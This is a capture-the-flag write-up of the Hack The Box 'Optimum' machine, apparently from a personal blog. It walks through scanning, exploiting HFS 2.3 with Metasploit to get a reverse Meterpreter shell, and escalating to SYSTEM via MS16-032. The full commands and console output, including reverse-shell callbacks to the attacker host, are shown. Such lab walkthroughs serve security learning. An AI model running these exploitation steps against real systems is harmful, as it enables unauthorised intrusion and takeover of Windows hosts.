---
title: "HTB: Optimum [Easy]"
date: 2025-01-07 00:00 +0800
categories: [HTB]
tags: [HTB, Easy, Metasploit, Windows Server]
image: https://github.com/user-attachments/assets/2211926e-985e-447e-a3c9-3ab451fcce0b
---

<img width="871" height="332" alt="image" src="https://github.com/user-attachments/assets/2211926e-985e-447e-a3c9-3ab451fcce0b" />

nmap scan result:
```
┌──(kryzi㉿kryzi)-[~/Desktop/HTB/Optimum]
└─$ nmap -sCV -p- -T4 -vvv -oA nmap/ 10.10.10.8
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-07 15:19 +0800
NSE: Loaded 158 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:19
Completed NSE at 15:19, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:19
Completed NSE at 15:19, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:19
Completed NSE at 15:19, 0.00s elapsed
Initiating Ping Scan at 15:19
Scanning 10.10.10.8 [4 ports]
Completed Ping Scan at 15:19, 0.03s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 15:19
Completed Parallel DNS resolution of 1 host. at 15:19, 0.50s elapsed
DNS resolution of 1 IPs took 0.50s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 15:19
Scanning 10.10.10.8 [65535 ports]
Discovered open port 80/tcp on 10.10.10.8
SYN Stealth Scan Timing: About 22.71% done; ETC: 15:21 (0:01:45 remaining)
SYN Stealth Scan Timing: About 58.56% done; ETC: 15:20 (0:00:43 remaining)
Completed SYN Stealth Scan at 15:20, 88.13s elapsed (65535 total ports)
Initiating Service scan at 15:20
Scanning 1 service on 10.10.10.8
Completed Service scan at 15:20, 6.24s elapsed (1 service on 1 host)
NSE: Script scanning 10.10.10.8.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:20
Completed NSE at 15:20, 5.05s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:20
Completed NSE at 15:20, 0.48s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:20
Completed NSE at 15:20, 0.00s elapsed
Nmap scan report for 10.10.10.8
Host is up, received echo-reply ttl 127 (0.015s latency).
Scanned at 2026-01-07 15:19:07 +08 for 100s
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE REASON          VERSION
80/tcp open  http    syn-ack ttl 127 HttpFileServer httpd 2.3
|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
|_http-server-header: HFS 2.3
|_http-title: HFS /
| http-methods:
|_  Supported Methods: GET HEAD POST
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:20
Completed NSE at 15:20, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:20
Completed NSE at 15:20, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:20
Completed NSE at 15:20, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.67 seconds
           Raw packets sent: 131139 (5.770MB) | Rcvd: 74 (3.696KB)
```

From this scan result, we find an open `port 80` running `httpfileserver (HTP) 2.3` as the version.

I directly find for known exploits from **searchsploit**. 

```
┌──(kryzi㉿kryzi)-[~/Desktop/HTB/Optimum]
└─$ searchsploit hfs 2.3
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                        |  Path
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)                                                                           | windows/remote/49584.py
HFS Http File Server 2.3m Build 300 - Buffer Overflow (PoC)                                                                           | multiple/remote/48569.py
Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit)                                                                | windows/remote/34926.rb
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload                                                                        | multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)                                                                   | windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                                                                   | windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution                                                              | windows/webapps/34852.txt
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
There are known RCE, i prefer using metasploit framework. 
```
┌──(kryzi㉿kryzi)-[~/Desktop/HTB/Optimum]
└─$ msfconsole -q
msf > search hfs 2.3

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank       Check  Description
   -  ----                                                 ---------------  ----       -----  -----------
   0  exploit/multi/http/git_client_command_exec           2014-12-18       excellent  No     Malicious Git and Mercurial HTTP Server For CVE-2014-9390
   1    \_ target: Automatic                               .                .          .      .
   2    \_ target: Windows Powershell                      .                .          .      .
   3  exploit/windows/http/rejetto_hfs_rce_cve_2024_23692  2024-05-25       excellent  Yes    Rejetto HTTP File Server (HFS) Unauthenticated Remote Code Execution
   4  exploit/windows/http/rejetto_hfs_exec                2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/http/rejetto_hfs_exec

msf >
```
There are 4 modules, however we would choose either 3/4 but im choosing **4** instead cause the machine is around **2017** so it should be the intended way
```
msf >  use 4
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf exploit(windows/http/rejetto_hfs_exec) > options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks5h, sapni, http, socks4, socks5
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all ad
                                         dresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.134.128  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.10.10.8
RHOSTS => 10.10.10.8
msf exploit(windows/http/rejetto_hfs_exec) > set LHOST tun0
LHOST => 10.10.16.6
msf exploit(windows/http/rejetto_hfs_exec) > set LPORT 6666
LPORT => 6666
msf exploit(windows/http/rejetto_hfs_exec) > exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf exploit(windows/http/rejetto_hfs_exec) >
[*] Started reverse TCP handler on 10.10.16.6:6666
[*] Using URL: http://10.10.16.6:8080/B4BlrSqjnluS1F
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /B4BlrSqjnluS1F
[*] Sending stage (188998 bytes) to 10.10.10.8
[!] Tried to delete %TEMP%\iZnOl.vbs, unknown result
[*] Meterpreter session 1 opened (10.10.16.6:6666 -> 10.10.10.8:49179) at 2026-01-07 16:35:19 +0800

msf exploit(windows/http/rejetto_hfs_exec) >
[*] Server stopped.
```
### Shell as kostas

We successfully able to get a shell as kostas
```
msf exploit(windows/http/rejetto_hfs_exec) > sessions

Active sessions
===============

  Id  Name  Type                     Information               Connection
  --  ----  ----                     -----------               ----------
  1         meterpreter x86/windows  OPTIMUM\kostas @ OPTIMUM  10.10.16.6:6666 -> 10.10.10.8:49179 (10.10.10.8)

msf exploit(windows/http/rejetto_hfs_exec) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > shell
Process 3056 created.
Channel 2 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop>whoami
whoami
optimum\kostas

C:\Users\kostas\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is EE82-226D

 Directory of C:\Users\kostas\Desktop

13/01/2026  04:37 ��    <DIR>          .
13/01/2026  04:37 ��    <DIR>          ..
13/01/2026  07:02 ��    <DIR>          %TEMP%
18/03/2017  02:11 ��           760.320 hfs.exe
13/01/2026  01:11 ��                34 user.txt
07/01/2026  08:07 ��        10.171.904 win.exe
               3 File(s)     10.932.258 bytes
               3 Dir(s)   5.675.802.624 bytes free

C:\Users\kostas\Desktop>type user.txt
type user.txt
dbf90e554885c75f0111d970f1a95d18
```
However, we are denied when trying to access Administrator. Meaning we required to escalate our privilege
```
C:\Users\kostas\Desktop>cd ../..
cd ../..

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is EE82-226D

 Directory of C:\Users

18/03/2017  01:57 ��    <DIR>          .
18/03/2017  01:57 ��    <DIR>          ..
18/03/2017  01:52 ��    <DIR>          Administrator
18/03/2017  01:57 ��    <DIR>          kostas
22/08/2013  05:39 ��    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)   5.675.802.624 bytes free

C:\Users>cd Administrator
cd Administrator
Access is denied.

C:\Users>
```
Next step? we are using metasploit framework. Of course! Local Suggester
```
C:\Users>^Z
Background channel 2? [y/N]  y
meterpreter >
Background session 1? [y/N]

msf exploit(windows/http/rejetto_hfs_exec) > search suggester                                                                                                                             
                                                                                                                                                                                               
Matching Modules                                                                                                                                                                               
================                                                                                                                                                                               
                                                                                                                                                                                               
   #  Name                                      Disclosure Date  Rank    Check  Description                                                                                                    
   -  ----                                      ---------------  ----    -----  -----------                                                                                                    
   0  post/multi/recon/local_exploit_suggester  .                normal  No     Multi Recon Local Exploit Suggester                                                                            
   1  post/multi/recon/persistence_suggester    .                normal  No     Persistence Exploit Suggester                                                                                  


Interact with a module by name or index. For example info 1, use 1 or use post/multi/recon/persistence_suggester

msf exploit(windows/http/rejetto_hfs_exec) > use 0
msf post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf post(multi/recon/local_exploit_suggester) > exploit -j
[*] Post module running as background job 5.
msf post(multi/recon/local_exploit_suggester) >
[*] 10.10.10.8 - Collecting local exploits for x86/windows...
[*] Collecting exploit 2584 / 2584
[*] 10.10.10.8 - 229 exploit checks are being tried...
[+] 10.10.10.8 - exploit/windows/local/bypassuac_comhijack: The target appears to be vulnerable.
[+] 10.10.10.8 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.8 - exploit/windows/local/bypassuac_sluihijack: The target appears to be vulnerable.
[+] 10.10.10.8 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated. Vulnerable Windows 8.1/Windows Server 2012 R2 build detected!
[+] 10.10.10.8 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.10.10.8 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.
[*] Running check method for exploit 43 / 43
[*] 10.10.10.8 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_comhijack                      Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/bypassuac_sluihijack                     Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 8.1/Windows Server 2012 R2 build detected!
 5   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
 6   exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/adobe_sandbox_adobecollabsync            No                       Cannot reliably check exploitability.
 8   exploit/windows/local/agnitum_outpost_acs                      No                       The target is not exploitable.
 9   exploit/windows/local/always_install_elevated                  No                       The target is not exploitable.
 10  exploit/windows/local/anyconnect_lpe                           No                       The target is not exploitable. vpndownloader.exe not found on file system
 11  exploit/windows/local/bits_ntlm_token_impersonation            No                       The target is not exploitable.
 12  exploit/windows/local/bthpan                                   No                       The target is not exploitable.
 13  exploit/windows/local/bypassuac_fodhelper                      No                       The target is not exploitable.
 14  exploit/windows/local/canon_driver_privesc                     No                       The target is not exploitable. No Canon TR150 driver directory found
 15  exploit/windows/local/cve_2020_1048_printerdemon               No                       The target is not exploitable.
 16  exploit/windows/local/cve_2020_1337_printerdemon               No                       The target is not exploitable.
 17  exploit/windows/local/gog_galaxyclientservice_privesc          No                       The target is not exploitable. Galaxy Client Service not found
 18  exploit/windows/local/ikeext_service                           No                       The check raised an exception.
 19  exploit/windows/local/ipass_launch_app                         No                       The check raised an exception.
 20  exploit/windows/local/lenovo_systemupdate                      No                       The check raised an exception.
 21  exploit/windows/local/lexmark_driver_privesc                   No                       The check raised an exception.
 22  exploit/windows/local/mqac_write                               No                       The target is not exploitable.
 23  exploit/windows/local/ms10_015_kitrap0d                        No                       The target is not exploitable.
 24  exploit/windows/local/ms10_092_schelevator                     No                       The target is not exploitable. Windows Server 2012 R2 (6.3 Build 9600). is not vulnerable
 25  exploit/windows/local/ms13_053_schlamperei                     No                       The target is not exploitable.
 26  exploit/windows/local/ms13_081_track_popup_menu                No                       Cannot reliably check exploitability.
 27  exploit/windows/local/ms14_058_track_popup_menu                No                       The target is not exploitable.
 28  exploit/windows/local/ms14_070_tcpip_ioctl                     No                       The target is not exploitable.
 29  exploit/windows/local/ms15_004_tswbproxy                       No                       The target is not exploitable.
 30  exploit/windows/local/ms15_051_client_copy_image               No                       The target is not exploitable.
 31  exploit/windows/local/ms16_016_webdav                          No                       The target is not exploitable.
 32  exploit/windows/local/ms16_075_reflection                      No                       The target is not exploitable.
 33  exploit/windows/local/ms16_075_reflection_juicy                No                       The target is not exploitable.
 34  exploit/windows/local/ms_ndproxy                               No                       The target is not exploitable.
 35  exploit/windows/local/novell_client_nicm                       No                       The target is not exploitable.
 36  exploit/windows/local/ntapphelpcachecontrol                    No                       The check raised an exception.
 37  exploit/windows/local/ntusermndragover                         No                       The target is not exploitable.
 38  exploit/windows/local/panda_psevents                           No                       The target is not exploitable.
 39  exploit/windows/local/ppr_flatten_rec                          No                       The target is not exploitable.
 40  exploit/windows/local/ricoh_driver_privesc                     No                       The target is not exploitable. No Ricoh driver directory found
 41  exploit/windows/local/virtual_box_guest_additions              No                       The target is not exploitable.
 42  exploit/windows/local/webexec                                  No                       The check raised an exception.
 43  exploit/windows/persistence/notepadpp_plugin_persistence       No                       The target is not exploitable. Notepad++ is probably not present


msf post(multi/recon/local_exploit_suggester) > 
```
Ive tried multiple but one of it that work for me is `exploit/windows/local/ms16_032_secondary_logon_handle_privesc`:
```
msf post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > options

Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86



View the full module info with the info, or info -d command.

msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set session 1
session => 1
msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set lport 1234
lport => 1234
msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > run
[*] Started reverse TCP handler on 10.10.16.6:1234
[+] Compressed size: 1160
[!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
[*] Writing payload file, C:\Users\kostas\AppData\Local\Temp\YplsUwkW.ps1...
[*] Compressing script contents...
[+] Compressed size: 3753
[*] Executing exploit script...
	 __ __ ___ ___   ___     ___ ___ ___
	|  V  |  _|_  | |  _|___|   |_  |_  |
	|     |_  |_| |_| . |___| | |_  |  _|
	|_|_|_|___|_____|___|   |___|___|___|
	
	               [by b33f -> @FuzzySec]

[?] Operating system core count: 2
[>] Duplicating CreateProcessWithLogonW handle
[?] Done, using thread handle: 2000

[*] Sniffing out privileged impersonation token..

[?] Thread belongs to: svchost
[+] Thread suspended
[>] Wiping current impersonation token
[>] Building SYSTEM impersonation token
[ref] cannot be applied to a variable that does not exist.
At line:200 char:3
+         $eCwJF = [Ntdll]::NtImpersonateThread($jX, $jX, [ref]$myjhj)
+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (myjhj:VariablePath) [], Runti
   meException
    + FullyQualifiedErrorId : NonExistingVariableReference

[!] NtImpersonateThread failed, exiting..
[+] Thread resumed!

[*] Sniffing out SYSTEM shell..

[>] Duplicating SYSTEM token
Cannot convert argument "ExistingTokenHandle", with value: "", for "DuplicateTo
ken" to type "System.IntPtr": "Cannot convert null to type "System.IntPtr"."
At line:259 char:2
+     $eCwJF = [Advapi32]::DuplicateToken($sy2nh, 2, [ref]$tXK)
+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodException
    + FullyQualifiedErrorId : MethodArgumentConversionInvalidCastArgument

[>] Starting token race
[>] Starting process race
[!] Holy handle leak Batman, we have a SYSTEM shell!!

Qi1IepeC52GvYvbJ6U57a7mrBibQt8s2
[+] Executed on target machine.
[*] Sending stage (188998 bytes) to 10.10.10.8
[*] Meterpreter session 2 opened (10.10.16.6:1234 -> 10.10.10.8:49183) at 2026-01-07 17:06:25 +0800
[+] Deleted C:\Users\kostas\AppData\Local\Temp\YplsUwkW.ps1

meterpreter >

```
### Shell as system
